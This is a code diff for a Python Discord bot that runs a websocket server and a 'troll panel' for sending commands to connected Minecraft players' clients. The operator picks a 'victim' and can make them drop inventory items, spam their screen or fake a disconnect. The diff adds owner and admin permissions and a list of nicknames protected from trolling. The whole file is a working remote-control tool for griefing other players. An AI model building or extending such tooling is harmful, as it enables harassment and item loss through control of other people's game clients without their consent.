@@ -7,13 +7,46 @@ import websockets
 from websockets.asyncio.server import serve
 
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
-TROLL_CHANNEL_ID = 1515619222842114158  # ID канала куда бот пришлёт панель
+TROLL_CHANNEL_ID = 1515619222842114158
 WS_PORT = 8765
 
-intents = discord.Intents.default()
-bot = commands.Bot(command_prefix="!", intents=intents)
+CONFIG_FILE = "config.json"
 
-# nick -> {"ws": ..., "server": ...}
+# ── Конфиг ───────────────────────────────────────────────────────────────────
+
+def load_config():
+    if os.path.exists(CONFIG_FILE):
+        with open(CONFIG_FILE, "r") as f:
+            return json.load(f)
+    return {"owner_id": None, "admin_ids": [], "protected_nicks": []}
+
+def save_config():
+    with open(CONFIG_FILE, "w") as f:
+        json.dump({
+            "owner_id": config["owner_id"],
+            "admin_ids": list(config["admin_ids"]),
+            "protected_nicks": list(config["protected_nicks"])
+        }, f, indent=2)
+
+config = load_config()
+config["admin_ids"] = set(config["admin_ids"])
+config["protected_nicks"] = set(config["protected_nicks"])
+
+def is_owner(user_id: int) -> bool:
+    return config["owner_id"] == user_id
+
+def is_admin(user_id: int) -> bool:
+    return is_owner(user_id) or user_id in config["admin_ids"]
+
+def is_protected(nick: str) -> bool:
+    return nick.lower() in {n.lower() for n in config["protected_nicks"]}
+
+# ── Discord бот ───────────────────────────────────────────────────────────────
+
+intents = discord.Intents.default()
+intents.message_content = True
+bot = commands.Bot(command_prefix="/", intents=intents)
+
 connected_players: dict[str, dict] = {}
 troll_message: discord.Message = None
 
@@ -24,11 +57,12 @@ def make_embed(players: dict) -> discord.Embed:
         lines = []
         for nick, info in players.items():
             server = info.get("server", "???")
-            lines.append(f"• `{nick}` — {server}")
+            shield = " 🛡️" if is_protected(nick) else ""
+            lines.append(f"• `{nick}`{shield} — {server}")
         embed.add_field(name="🟢 Онлайн", value="\n".join(lines), inline=False)
     else:
         embed.add_field(name="🔴 Онлайн", value="Никого нет", inline=False)
-    embed.set_footer(text="Выбери игрока и нажми кнопку")
+    embed.set_footer(text="Выбери игрока и нажми кнопку | 🛡️ = защищён")
     return embed
 
 
@@ -41,8 +75,15 @@ class PlayerSelect(discord.ui.Select):
         super().__init__(placeholder="Выбери жертву...", options=options)
 
     async def callback(self, interaction: discord.Interaction):
+        if not is_admin(interaction.user.id):
+            await interaction.response.send_message("❌ У тебя нет доступа к панели!", ephemeral=True)
+            return
         bot.selected_player = self.values[0]
-        await interaction.response.send_message(f"✅ Выбран: `{self.values[0]}`", ephemeral=True)
+        nick = self.values[0]
+        if is_protected(nick):
+            await interaction.response.send_message(f"🛡️ `{nick}` защищён от троллинга!", ephemeral=True)
+        else:
+            await interaction.response.send_message(f"✅ Выбран: `{nick}`", ephemeral=True)
 
 
 class DropModal(discord.ui.Modal, title="Выбросить предметы"):
@@ -53,6 +94,9 @@ class DropModal(discord.ui.Modal, title="Выбросить предметы"):
         player = getattr(bot, "selected_player", None)
         if not player or player not in connected_players:
             await interaction.response.send_message("❌ Игрок не выбран!", ephemeral=True)
+            return
+        if is_protected(player):
+            await interaction.response.send_message(f"🛡️ `{player}` защищён!", ephemeral=True)
             return
         slot_val = self.slot.value.strip().lower()
         amount_val = self.amount.value.strip().lower()
@@ -88,6 +132,9 @@ class SpamModal(discord.ui.Modal, title="Спам на экране"):
         if not player or player not in connected_players:
             await interaction.response.send_message("❌ Игрок не выбран!", ephemeral=True)
             return
+        if is_protected(player):
+            await interaction.response.send_message(f"🛡️ `{player}` защищён!", ephemeral=True)
+            return
         try:
             c = int(self.count.value.strip())
             if not 1 <= c <= 30:
@@ -107,9 +154,15 @@ class TrollView(discord.ui.View):
         self.add_item(PlayerSelect())
 
     async def send_cmd(self, interaction: discord.Interaction, cmd: str, label: str):
+        if not is_admin(interaction.user.id):
+            await interaction.response.send_message("❌ У тебя нет доступа!", ephemeral=True)
+            return
         player = getattr(bot, "selected_player", None)
         if not player or player not in connected_players:
             await interaction.response.send_message("❌ Сначала выбери игрока!", ephemeral=True)
+            return
+        if is_protected(player):
+            await interaction.response.send_message(f"🛡️ `{player}` защищён от троллинга!", ephemeral=True)
             return
         try:
             await connected_players[player]["ws"].send(cmd)
@@ -131,10 +184,16 @@ class TrollView(discord.ui.View):
 
     @discord.ui.button(label="📦 Выбросить предметы...", style=discord.ButtonStyle.danger, row=2)
     async def drop(self, interaction, button):
+        if not is_admin(interaction.user.id):
+            await interaction.response.send_message("❌ У тебя нет доступа!", ephemeral=True)
+            return
         await interaction.response.send_modal(DropModal())
 
     @discord.ui.button(label="💬 Спам на экране...", style=discord.ButtonStyle.primary, row=2)
     async def spam(self, interaction, button):
+        if not is_admin(interaction.user.id):
+            await interaction.response.send_message("❌ У тебя нет доступа!", ephemeral=True)
+            return
         await interaction.response.send_modal(SpamModal())
 
     @discord.ui.button(label="📡 Фейк-дисконнект", style=discord.ButtonStyle.secondary, row=2)
@@ -151,6 +210,9 @@ class TrollView(discord.ui.View):
 
     @discord.ui.button(label="🔄 Обновить список", style=discord.ButtonStyle.success, row=4)
     async def refresh(self, interaction, button):
+        if not is_admin(interaction.user.id):
+            await interaction.response.send_message("❌ У тебя нет доступа!", ephemeral=True)
+            return
         await interaction.response.edit_message(
             embed=make_embed(connected_players),
             view=TrollView()
@@ -166,6 +228,15 @@ async def update_panel():
             pass
 
 
+async def notify_player(nick: str, protected: bool):
+    if nick in connected_players:
+        try:
+            ws = connected_players[nick]["ws"]
+            await ws.send(json.dumps({"type": "admin_status", "protected": protected}))
+        except:
+            pass
+
+
 async def ws_handler(ws):
     nick = None
     try:
@@ -176,6 +247,8 @@ async def ws_handler(ws):
                 server = data.get("server", "...")
                 connected_players[nick] = {"ws": ws, "server": server}
                 print(f"[WS] Подключился: {nick} @ {server}")
+                # Сообщаем игроку его статус защиты
+                await ws.send(json.dumps({"type": "admin_status", "protected": is_protected(nick)}))
                 await update_panel()
             elif data.get("type") == "server" and nick in connected_players:
                 connected_players[nick]["server"] = data["server"]
@@ -193,6 +266,89 @@ async def start_ws_server():
     async with serve(ws_handler, "0.0.0.0", WS_PORT) as server:
         print(f"[WS] Сервер запущен на порту {WS_PORT}")
         await server.serve_forever()
+
+
+# ── Команды ──────────────────────────────────────────────────────────────────
+
+@bot.command(name="setowner")
+async def set_owner(ctx, discord_id: int):
+    """/setowner <id> — установить владельца (работает только если владелец ещё не задан)."""
+    if config["owner_id"] is not None:
+        if not is_owner(ctx.author.id):
+            await ctx.message.delete()
+            await ctx.send("❌ Владелец уже задан.", delete_after=5)
+            return
+    config["owner_id"] = discord_id
+    save_config()
+    await ctx.message.delete()
+    await ctx.send(f"👑 Владелец установлен: `{discord_id}`", delete_after=5)
+
+
+@bot.command(name="addidadmin")
+async def add_id_admin(ctx, discord_id: int):
+    """/addidadmin <discord_id> — добавить админа по Discord ID."""
+    await ctx.message.delete()
+    if not is_owner(ctx.author.id):
+        await ctx.send("❌ Только владелец может добавлять админов.", delete_after=5)
+        return
+    config["admin_ids"].add(discord_id)
+    save_config()
+    await ctx.send(f"✅ Администратор `{discord_id}` добавлен.", delete_after=5)
+
+
+@bot.command(name="removeadmin")
+async def remove_admin(ctx, discord_id: int):
+    """/removeadmin <discord_id> — убрать админа."""
+    await ctx.message.delete()
+    if not is_owner(ctx.author.id):
+        await ctx.send("❌ Только владелец может убирать админов.", delete_after=5)
+        return
+    config["admin_ids"].discard(discord_id)
+    save_config()
+    await ctx.send(f"✅ Администратор `{discord_id}` удалён.", delete_after=5)
+
+
+@bot.command(name="addNotroll")
+async def add_notroll(ctx, mc_nick: str):
+    """/addNotroll <ник> — защитить Minecraft ник от троллинга."""
+    await ctx.message.delete()
+    if not is_admin(ctx.author.id):
+        await ctx.send("❌ Нет доступа.", delete_after=5)
+        return
+    config["protected_nicks"].add(mc_nick)
+    save_config()
+    await notify_player(mc_nick, True)
+    await update_panel()
+    await ctx.send(f"🛡️ Ник `{mc_nick}` теперь защищён.", delete_after=5)
+
+
+@bot.command(name="removeNotroll")
+async def remove_notroll(ctx, mc_nick: str):
+    """/removeNotroll <ник> — снять защиту с ника."""
+    await ctx.message.delete()
+    if not is_admin(ctx.author.id):
+        await ctx.send("❌ Нет доступа.", delete_after=5)
+        return
+    config["protected_nicks"].discard(mc_nick)
+    save_config()
+    await notify_player(mc_nick, False)
+    await update_panel()
+    await ctx.send(f"✅ Ник `{mc_nick}` больше не защищён.", delete_after=5)
+
+
+@bot.command(name="adminlist")
+async def admin_list(ctx):
+    """/adminlist — список всех админов и защищённых ников."""
+    await ctx.message.delete()
+    if not is_owner(ctx.author.id):
+        await ctx.send("❌ Только владелец.", delete_after=5)
+        return
+    lines = [f"👑 Владелец: `{config['owner_id']}`"]
+    if config["admin_ids"]:
+        lines.append("👮 Админы: " + ", ".join(f"`{i}`" for i in config["admin_ids"]))
+    if config["protected_nicks"]:
+        lines.append("🛡️ Защищённые: " + ", ".join(f"`{n}`" for n in config["protected_nicks"]))
+    await ctx.send("\n".join(lines), delete_after=15)
 
 
 @bot.event
